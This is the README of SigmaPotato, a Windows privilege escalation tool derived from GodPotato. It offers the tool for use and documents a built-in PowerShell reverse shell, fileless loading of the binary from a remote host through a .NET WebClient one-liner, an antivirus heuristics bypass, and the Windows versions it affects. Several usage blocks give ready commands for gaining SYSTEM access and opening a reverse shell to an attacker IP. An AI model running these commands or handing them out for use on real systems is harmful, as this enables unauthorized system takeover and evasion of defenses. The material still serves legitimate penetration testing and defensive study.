
This gaudy repository is a derivative of the [GodPotato](https://github.com/BeichenDream/GodPotato) project, 
aiming to enhance the original work's functionality and user-friendliness.  With my bread-and-butter generally
being PowerShell implementation and visual formatting, the primary focus is on enhancing PowerShell support
and output verbosity for a more intuitive and effective user experience.

![Banner](https://cdn.discordapp.com/attachments/855920119292362802/1156633429950070905/image.png?ex=6515ae52&is=65145cd2&hm=4d074ce6dc39da8b268619f965c14539c60dcb9e0a1fb01dfcae68bdd1fe372c&)


# Table of Contents <a name="tableContents"></a>

1. [**Added Functionality over the Original GodPotato**](#addedFunctionality)
2. [**General Usage**](#generalUsage)
    - [**Usage from Disk via the Binary**](#binaryUsage)
	- [**Usage from Memory via .NET Reflection**](#reflectionUsage)
	- [**Error Correction**](#errorCorrection)
	- [**Examples**](#examples)
3. [**Windows OS Version Compatibility**](#versionCompatiblity)
4. [**Credits & Thanks**](#credits)
	- [**BeichenDream**](#beichenDream)
	- [**NukingDragons**](#nukingDragons)
5. [**License**](#license)

# Added Functionality over the Original GodPotato <a name="addedFunctionality"></a>

## v1.0.0
```
[+] Support for execution from memory via .NET reflection.
    o (allows privilege escalation without writing a binary to disk)
    o (help page includes syntax for both local and remote reflection)
	
[+] Built in reverse shell functionality using '--revshell'.
    o (reverse shell is a custom PowerShell-based payload)
	
[+] Bypassed the 1024 max character limit when executing PowerShell commands.
    o (accomplished via exploiting process environment block inheritance)
    o (theoretical character limit: 32,767)
	
[+] Streamlined tool usage by utilizing implied variables over specified variables.
    o (e.g., no more needing to specifiy the '-cmd' parameter)
	
[+] Enhanced visual formatting of PowerShell process output.
    o (e.g., voiding PowerShell's serialization format "#< CLIXML")
	
[+] Increased output verbosity and visual formatting.
    o (error output verbosity by including suggestions for common error messages)
    o (process outputting and usage help vastly improved)
```

## v1.2.5
```
[+] Streamlined usage when using .NET reflection.
    o (e.g., can now be executed via "[SigmaPotato]::Main('<command>')")
    
[+] Improved reverse shell stability and verbosity.
    o (better error correction and now intercepts console data streams)
    
[+] Further refined visual formatting.
    o (cleaned up help message, hints, and general output)
    
```

## v1.2.6
```
[+] Added rudimentary AV heuristics bypass by calling an uncommon API.
    o (calling 'VirtualAllocExNuma()' should fail when being analyzed by heuristics engines)
    o (will still likely get caught by most up-to-date Windows Defender w/ Real-time protection)
    
[+] Cleaned up '--help' message.
    o (minor tweaks and spacing)
```

## Work-in-Progress (WIP)
```
[+] Introduce '--interactive' process support.
    o (this will require 'SeAssignPrimaryTokenPrivilege')
    
[+] Save process output to exported environment variable.
    o (save output of the execute process/command to "$env:SigmaOutput")
    o (will likely only be applicable when using reflection) 
```

[**Return to Table of Contents**](#tableContents)


# General Usage <a name="generalUsage"></a>

**Requirements:**
```txt
Run as a user with 'SeImpersonatePrivilege' (or 'SeAssignPrimaryTokenPrivilege') user rights.
```

Checking the help message with ``--help``

![Help](https://cdn.discordapp.com/attachments/855920119292362802/1156634215748730951/image.png?ex=6515af0e&is=65145d8e&hm=7cfacf49ff65f434e74590ed4d2e64433984a1b7970a9b2030fce94e0859ff6e&)

[**Return to Table of Contents**](#tableContents)


## Usage from Disk via the Binary <a name="binaryUsage"></a>

The easiest way to use ``SigmaPotato`` is by interacting with the binary like you would any other program.
```powershell
# Execute a Command
./SigmaPotato.exe <command>


# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>


# Return Help Information
./SigmaPotato.exe --help
```

[**Return to Table of Contents**](#tableContents)


## Usage from Memory via .NET Reflection <a name="reflectionUsage"></a>


Prior to privilege escalation, we need to load ``SigmaPotato`` into memory using .NET reflection.

```powershell
# Load from a Local Binary already on Disk
[System.Reflection.Assembly]::LoadFile("$PWD/SigmaPotato.exe")


# Load from a Remotely Hosted Binary via a WebClient
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SigmaPotato.exe")
[System.Reflection.Assembly]::Load($DownloadData)


# Load from a Remotely Hosted Binary via a WebClient (one-liner)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http(s)://<ip_addr>/SigmaPotato.exe"))
```
- Note: running a simple HTTP server is sufficient for hosting (e.g., ``python -m http.server 80``)
---

Once the ``SigmaPotato`` namespace has been loaded into the current session, you can use it for privilege escalation.

```powershell
# Execute a Command
[SigmaPotato]::Main("<command>")


# Establish a PowerShell Reverse Shell
$RevShell = @("--revshell", "<ip_addr>", "<port>")
[SigmaPotato]::Main($RevShell)


# Establish a PowerShell Reverse Shell (one-liner)
[SigmaPotato]::Main(@("--revshell","<ip_address>","<port>"))
```
- Note: as of ``v1.2.5``, execution no longer requires ``[SigmaPotato.Program]``

[**Return to Table of Contents**](#tableContents)


## Error Correction <a name="errorCorrection"></a>


I made an active effort to document the majority of errors I came accross.
Hopefully this effort allows any error you come across to be quickly diagnosed.

**General usage corrections.**
```txt
PS C:\Users\JoeSchmoe> .\SigmaPotato.exe
[-] No arguments detected.  Use '--help' for usage information.


PS C:\Users\JoeSchmoe> .\SigmaPotato.exe cmd.exe /c whoami
[-] Unexpected arguments detected.  Use '--help' for usage information.
 o  (Hint: you might need to wrap your arguments in quotations)


PS C:\Users\JoeSchmoe> .\SigmaPotato.exe --revshell
[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.
 o  (Hint: you need to specify an IP address and port)
```

**Invalid filename (or filename not in the default path).**

![Invalid Filename](https://cdn.discordapp.com/attachments/855920119292362802/1156635021856231484/image.png?ex=6515afce&is=65145e4e&hm=b7385f8dbf4d04fb1d42b1e1d8a8f0e884a032e44ee2aba8ebff6f0eaa834d4a&)

**Command likely exceeds the character limit:**
- Note: this error wouldn't occur if the command was prefaced with "powershell".

![Command Too Long](https://cdn.discordapp.com/attachments/855920119292362802/1156635670840877116/image.png?ex=6515b069&is=65145ee9&hm=c766de4648fa96211e5ddf20f96dadfff756e3f7c4ba8868ade12505b8477da0&)

**User does not have 'SeImpersonatePrivilege' (or 'SeAssignPrimaryTokenPrivilege') user rights:**

![Invalid Privileges](https://cdn.discordapp.com/attachments/855920119292362802/1156637078499631224/image.png?ex=6515b1b8&is=65146038&hm=58b95348a4114bac583c6c5259a8c143b2c3f4f56bff8d9217a4c592c9d3e962&)

[**Return to Table of Contents**](#tableContents)


## Examples <a name="examples"></a>


Below are two examples of ``SigmaPotato.exe`` usage.

1. **Simple Example:** Using ``--revshell`` functionality when using the binary.
2. **Advanced Example:** Using .NET reflection and a custom SSL PowerShell reverse shell payload that exceeds the 1024 character limit (taken from my [PoorMansArmory](https://github.com/tylerdotrar/PoorMansArmory) repository).

**Simple Example:**

![Binary --revshell](https://cdn.discordapp.com/attachments/855920119292362802/1156638053977300993/image.png?ex=6515b2a1&is=65146121&hm=af35c3d2604948f04e3971c39af3d6a54a5dafe4a5abb6679e8d1fa4d34e9daa&)

**Advanced Example:**

![Reflection w/ Custom Payload](https://cdn.discordapp.com/attachments/855920119292362802/1156640112030011412/image.png?ex=6515b48c&is=6514630c&hm=86d25d61fc18ddf6b4cb03ee5a3a898fd4ae7904ed5c5e08d3bb0c5c5f1777e4&)

[**Return to Table of Contents**](#tableContents)


# Windows OS Version Compatibility <a name="versionCompatiblity"></a>

For this project I compiled two different binaries for maximum compatibility.  The default
**``SigmaPotato.exe``** has been tested and validated on a fresh installation of every Windows
operating system, from **``Windows 8/8.1 to Windows 11``** *and* **``Windows Server 2012 to Windows
Server 2019``**. The only *"issue"* with this binary is that .NET reflection does not work with PowerShell Core.

The separate **``SigmaPotatoCore.exe``** was compiled with .NET Framework v2.0 and supports .NET
reflection on PowerShell Core / .NET Core.  The downside is that this binary then requires
.NET Framework v3.5 (2.0 + 3.0) to be installed on the target system to work via normal binary 
execution.  So if you plan to only use reflection, this version would be optimal.

**TL;DR**

| Version | Compiled w/ | Binary Compatibility | Reflection Compatibility |
| --- | --- | --- | --- |
| **``SigmaPotato.exe``** | .NET Framework: ``v4.8`` | .NET Framework: ``Any`` | .NET Framework: ``Any (Non-Core)`` |
| **``SigmaPotatoCore.exe``** | .NET Framework: ``v2.0`` | .NET Framework: ``v3.5`` | .NET Framework: ``Any`` |

| Vulnerable Windows Versions |
| --- |
| Windows 8/8.1 - Windows 11 |
| Windows Server 2012 - Windows 2022 |

[**Return to Table of Contents**](#tableContents)


# Credits & Thanks <a name="credits"></a>

- Enormous credit to [@BeichenDream](https://github.com/BeichenDream) for the original [GodPotato](https://github.com/BeichenDream/GodPotato) project.  I couldn't have made any of this without his
hard work. <a name="beichenDream"></a>

- Huge shoutout to [@NukingDragons](https://github.com/nukingdragons) for being way smarter than me
and helping with the local environment block bootstrap. <a name="nukingDragons"></a>

[**Return to Table of Contents**](#tableContents)

---

# License <a name="license"></a>

- [Apache License 2.0](/LICENSE)
